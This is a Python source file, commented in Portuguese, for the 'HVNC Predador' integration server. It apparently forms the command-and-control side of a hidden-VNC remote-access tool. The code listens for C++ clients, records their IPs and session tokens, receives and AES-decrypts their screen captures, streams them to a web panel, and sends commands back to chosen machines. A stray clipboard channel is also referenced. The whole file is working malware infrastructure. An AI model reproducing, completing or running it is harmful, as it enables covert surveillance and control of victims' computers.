#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HVNC Predador - Integration Script
Script para integrar cliente C++ com servidor web
"""

import asyncio
import json
import logging
import socket
import threading
import time
from typing import Dict, Optional

from config import Config

class HVNCIntegration:
    """Classe para integração entre cliente C++ e servidor web"""
    
    def __init__(self, config: Config):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.clients: Dict[str, dict] = {}
        self.server_socket: Optional[socket.socket] = None
        self.running = False
        self.client_callbacks = []  # Callbacks para notificar mudanças nos clientes
        self.screen_callbacks = []  # Callbacks para notificar atualizações de tela
        
    def add_client_callback(self, callback):
        """Adiciona callback para notificar mudanças nos clientes"""
        self.client_callbacks.append(callback)
        
    def add_screen_callback(self, callback):
        """Adiciona callback para notificar atualizações de tela"""
        self.screen_callbacks.append(callback)
        
    def notify_client_change(self, event_type: str, client_id: str, client_data: dict = None):
        """Notifica todos os callbacks sobre mudanças nos clientes"""
        for callback in self.client_callbacks:
            try:
                callback(event_type, client_id, client_data)
            except Exception as e:
                self.logger.error(f"Erro ao executar callback de cliente: {e}")
                
    def notify_screen_update(self, client_id: str, screen_data: dict):
        """Notifica todos os callbacks sobre atualizações de tela"""
        for callback in self.screen_callbacks:
            try:
                callback(client_id, screen_data)
            except Exception as e:
                self.logger.error(f"Erro ao executar callback de tela: {e}")
        
    def start_integration_server(self):
        """Inicia servidor de integração para clientes C++"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.config.HVNC_HOST, self.config.HVNC_PORT))
            self.server_socket.listen(10)
            
            self.running = True
            self.logger.info(f"Servidor de integração iniciado em {self.config.HVNC_HOST}:{self.config.HVNC_PORT}")
            self.logger.info(f"Aguardando conexões de clientes...")
            
            while self.running:
                try:
                    self.logger.info(f"Chamando accept() no socket...")
                    client_socket, address = self.server_socket.accept()
                    self.logger.info(f"CONEXÃO ACEITA! Nova conexão de cliente: {address}")
                    
                    # Criar thread para cada cliente
                    client_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, address),
                        daemon=True
                    )
                    client_thread.start()
                    self.logger.info(f"Thread criada para cliente {address}")
                    
                except socket.error as e:
                    if self.running:
                        self.logger.error(f"Erro no socket do servidor: {e}")
                except Exception as e:
                    self.logger.error(f"Erro inesperado no loop do servidor: {e}")
                        
        except Exception as e:
            self.logger.error(f"Erro ao iniciar servidor de integração: {e}")
            import traceback
            self.logger.error(f"Traceback: {traceback.format_exc()}")
            
    def handle_client_connection(self, client_socket: socket.socket, address: tuple):
        """Manipula conexão individual do cliente"""
        client_id = f"{address[0]}:{address[1]}"
        
        try:
            self.logger.info(f"INICIANDO handle_client_connection para {client_id}")
            
            # Registrar cliente
            client_data = {
                'socket': client_socket,
                'address': address,
                'connected_at': time.time(),
                'last_activity': time.time(),
                'session_token': None,
                'screen_data': None,
                'ip': address[0],
                'port': address[1],
                'status': 'online'
            }
            self.clients[client_id] = client_data
            
            self.logger.info(f"Cliente {client_id} registrado com sucesso")
            
            # Notificar conexão do cliente
            self.notify_client_change('connected', client_id, client_data)
            self.logger.info(f"Notificação de conexão enviada para {client_id}")
            
            # Receber token de sessão
            session_token = self.receive_session_token(client_socket)
            if session_token:
                self.clients[client_id]['session_token'] = session_token
                self.logger.info(f"Token de sessão recebido para {client_id}: {session_token[:10]}...")
            
            # Loop principal de comunicação
            buffer = b''
            while self.running:
                try:
                    data = client_socket.recv(8192)
                    if not data:
                        break
                        
                    buffer += data
                    self.clients[client_id]['last_activity'] = time.time()
                    
                    # Processar dados recebidos
                    buffer = self.process_client_data(client_id, buffer)
                    
                except socket.timeout:
                    continue
                except socket.error as e:
                    self.logger.error(f"Erro na comunicação com {client_id}: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"Erro ao manipular cliente {client_id}: {e}")
            import traceback
            self.logger.error(f"Traceback: {traceback.format_exc()}")
        finally:
            self.logger.info(f"Finalizando conexão com cliente {client_id}")
            self.disconnect_client(client_id)
            
    def receive_session_token(self, client_socket: socket.socket) -> Optional[str]:
        """Recebe token de sessão do cliente"""
        try:
            self.logger.info("Iniciando recepção do token de sessão...")
            
            # Configurar timeout para evitar bloqueio
            client_socket.settimeout(10.0)
            
            # Receber tamanho do token
            self.logger.info("Aguardando dados do tamanho do token (4 bytes)...")
            size_data = client_socket.recv(4)
            self.logger.info(f"Recebidos {len(size_data)} bytes para tamanho do token: {size_data.hex()}")
            
            if len(size_data) != 4:
                self.logger.error(f"Tamanho incorreto dos dados de tamanho: {len(size_data)} bytes")
                return None
                
            token_size = int.from_bytes(size_data, byteorder='little')
            self.logger.info(f"Tamanho do token decodificado: {token_size} bytes")
            
            if token_size <= 0 or token_size > 1024:
                self.logger.error(f"Tamanho do token inválido: {token_size}")
                return None
                
            # Receber token
            self.logger.info(f"Aguardando dados do token ({token_size} bytes)...")
            token_data = b''
            while len(token_data) < token_size:
                chunk = client_socket.recv(token_size - len(token_data))
                if not chunk:
                    self.logger.error(f"Conexão fechada durante recepção do token. Recebidos {len(token_data)}/{token_size} bytes")
                    return None
                token_data += chunk
                self.logger.info(f"Recebidos {len(chunk)} bytes do token. Total: {len(token_data)}/{token_size}")
                
            token_str = token_data.decode('utf-8', errors='ignore')
            self.logger.info(f"Token de sessão recebido com sucesso: '{token_str}' ({len(token_str)} caracteres)")
            return token_str
            
        except socket.timeout as e:
            self.logger.error(f"Timeout ao receber token de sessão: {e}")
            return None
        except Exception as e:
            self.logger.error(f"Erro ao receber token de sessão: {e}")
            return None
        finally:
            # Restaurar timeout padrão
            client_socket.settimeout(None)
            
    def process_client_data(self, client_id: str, buffer: bytes) -> bytes:
        """Processa dados recebidos do cliente com novo protocolo IMG:"""
        try:
            # Log detalhado dos dados recebidos
            if len(buffer) > 0:
                self.logger.info(f"Dados recebidos de {client_id}: {len(buffer)} bytes, início: {buffer[:50]}")
            
            # CORREÇÃO CRÍTICA: Procurar por header IMG: em qualquer posição do buffer
            img_pos = buffer.find(b'IMG:')
            if img_pos != -1:
                # Se IMG: não está no início, descartar dados anteriores (provavelmente CLIP:)
                if img_pos > 0:
                    self.logger.info(f"Descartando {img_pos} bytes antes de IMG: para {client_id}")
                    buffer = buffer[img_pos:]
                    img_pos = 0
                self.logger.info(f"Header IMG: detectado para {client_id}")
                
                # Encontrar o fim do header (\n)
                header_end = buffer.find(b'\n')
                if header_end == -1:
                    self.logger.info(f"Header IMG: incompleto para {client_id}, aguardando mais dados")
                    return buffer  # Header incompleto, aguardar mais dados
                
                # Extrair tamanho da imagem do header
                header = buffer[4:header_end].decode('utf-8')
                self.logger.info(f"Header IMG: extraído para {client_id}: '{header}'")
                
                try:
                    image_size = int(header)
                    self.logger.info(f"Tamanho da imagem para {client_id}: {image_size} bytes")
                except ValueError:
                    self.logger.error(f"Header IMG: inválido para {client_id}: {header}")
                    return buffer[header_end + 1:]  # Pular header inválido
                
                # Verificar se temos dados suficientes
                data_start = header_end + 1
                if len(buffer) < data_start + image_size:
                    self.logger.info(f"Dados incompletos para {client_id}: {len(buffer)} < {data_start + image_size}, aguardando mais")
                    return buffer  # Dados incompletos, aguardar mais
                
                # Extrair dados da imagem
                image_data = buffer[data_start:data_start + image_size]
                remaining_buffer = buffer[data_start + image_size:]
                
                self.logger.info(f"Processando imagem para {client_id}: {len(image_data)} bytes")
                
                if image_data:
                    self.process_screen_data(client_id, image_data)
                    
                return remaining_buffer
            
            # Fallback para protocolo antigo com ENDIMG
            end_marker = b'ENDIMG'
            end_pos = buffer.find(end_marker)
            
            if end_pos != -1:
                # Extrair dados da imagem
                image_data = buffer[:end_pos]
                remaining_buffer = buffer[end_pos + len(end_marker):]
                
                if image_data:
                    self.process_screen_data(client_id, image_data)
                    
                return remaining_buffer
                
            return buffer
            
        except Exception as e:
            self.logger.error(f"Erro ao processar dados do cliente {client_id}: {e}")
            return buffer
            
    def process_screen_data(self, client_id: str, image_data: bytes):
        """Processa dados de tela recebidos"""
        try:
            if client_id in self.clients:
                # Descriptografar se necessário
                if self.config.USE_AES:
                    image_data = self.decrypt_image_data(image_data)
                # Se USE_AES está False, usar dados como estão (já são bytes)
                    
                # Armazenar dados da tela
                self.clients[client_id]['screen_data'] = image_data
                self.clients[client_id]['last_screen_update'] = time.time()
                
                self.logger.info(f"Dados de tela atualizados para {client_id}: {len(image_data)} bytes")
                
                # Notificar interface web via WebSocket broadcast
                self.broadcast_screen_update(client_id, image_data)
                
        except Exception as e:
            self.logger.error(f"Erro ao processar dados de tela para {client_id}: {e}")
            
    def decrypt_image_data(self, encrypted_data: bytes) -> bytes:
        """Descriptografa dados de imagem"""
        try:
            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
            from cryptography.hazmat.backends import default_backend
            
            if len(encrypted_data) < 16:
                return encrypted_data
                
            iv = encrypted_data[:16]
            ciphertext = encrypted_data[16:]
            
            # Garantir que AES_KEY seja bytes e tenha 32 bytes para AES-256
            aes_key = self.config.AES_KEY
            if isinstance(aes_key, str):
                aes_key = aes_key.encode('utf-8')
            elif not isinstance(aes_key, bytes):
                aes_key = str(aes_key).encode('utf-8')
            aes_key = aes_key[:32].ljust(32, b'\0')
            
            cipher = Cipher(
                algorithms.AES(aes_key),
                modes.CBC(iv),
                backend=default_backend()
            )
            
            decryptor = cipher.decryptor()
            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remover padding
            padding_length = decrypted[-1]
            return decrypted[:-padding_length]
            
        except Exception as e:
            self.logger.error(f"Erro ao descriptografar dados: {e}")
            return encrypted_data
            
    def broadcast_screen_update(self, client_id: str, image_data: bytes):
        """Transmite atualização de tela via WebSocket"""
        try:
            import base64
            # Converter dados binários para base64 para transmissão via WebSocket
            image_b64 = base64.b64encode(image_data).decode('utf-8')
            
            # Criar mensagem para WebSocket
            screen_message = {
                'type': 'screen_update',
                'client_id': client_id,
                'image_data': image_b64,
                'timestamp': time.time()
            }
            
            # Notificar via callback (será conectado ao WebSocket manager)
            self.notify_screen_update(client_id, screen_message)
            
        except Exception as e:
            self.logger.error(f"Erro ao transmitir atualização de tela: {e}")
        
    def send_command_to_client(self, client_id: str, command: str) -> bool:
        """Envia comando para cliente específico"""
        try:
            if client_id not in self.clients:
                return False
                
            client_socket = self.clients[client_id]['socket']
            command_data = command.encode('utf-8')
            
            # Enviar tamanho do comando
            size_bytes = len(command_data).to_bytes(4, byteorder='little')
            client_socket.send(size_bytes)
            
            # Enviar comando
            client_socket.send(command_data)
            
            self.logger.info(f"Comando enviado para {client_id}: {command}")
            return True
            
        except Exception as e:
            self.logger.error(f"Erro ao enviar comando para {client_id}: {e}")
            return False
            
    def disconnect_client(self, client_id: str):
        """Desconecta cliente"""
        try:
            if client_id in self.clients:
                client_data = self.clients[client_id].copy()
                client_socket = self.clients[client_id]['socket']
                client_socket.close()
                del self.clients[client_id]
                self.logger.info(f"Cliente {client_id} desconectado")
                
                # Notificar desconexão do cliente
                client_data['status'] = 'offline'
                client_data.pop('socket', None)  # Remover socket para serialização
                self.notify_client_change('disconnected', client_id, client_data)
                
        except Exception as e:
            self.logger.error(f"Erro ao desconectar cliente {client_id}: {e}")
            
    def get_client_info(self, client_id: str) -> Optional[dict]:
        """Retorna informações do cliente"""
        if client_id in self.clients:
            client = self.clients[client_id].copy()
            # Remover socket para serialização JSON
            client.pop('socket', None)
            client.pop('screen_data', None)
            return client
        return None
        
    def get_all_clients(self) -> Dict[str, dict]:
        """Retorna informações de todos os clientes"""
        self.logger.info(f"get_all_clients chamado. Total de clientes: {len(self.clients)}")
        self.logger.info(f"Clientes registrados: {list(self.clients.keys())}")
        
        result = {}
        for client_id in self.clients:
            client_info = self.get_client_info(client_id)
            result[client_id] = client_info
            self.logger.info(f"Cliente {client_id} info: {client_info}")
        
        self.logger.info(f"Resultado final get_all_clients: {result}")
        return result
        
    def stop(self):
        """Para o servidor de integração"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
            
        # Desconectar todos os clientes
        for client_id in list(self.clients.keys()):
            self.disconnect_client(client_id)
            
        self.logger.info("Servidor de integração parado")

# Instância global para uso no servidor web
integration_server = None

def start_integration(config: Config):
    """Inicia servidor de integração"""
    global integration_server
    integration_server = HVNCIntegration(config)
    
    # Executar em thread separada
    integration_thread = threading.Thread(
        target=integration_server.start_integration_server,
        daemon=True
    )
    integration_thread.start()
    
    return integration_server

def get_integration_server() -> Optional[HVNCIntegration]:
    """Retorna instância do servidor de integração"""
    return integration_server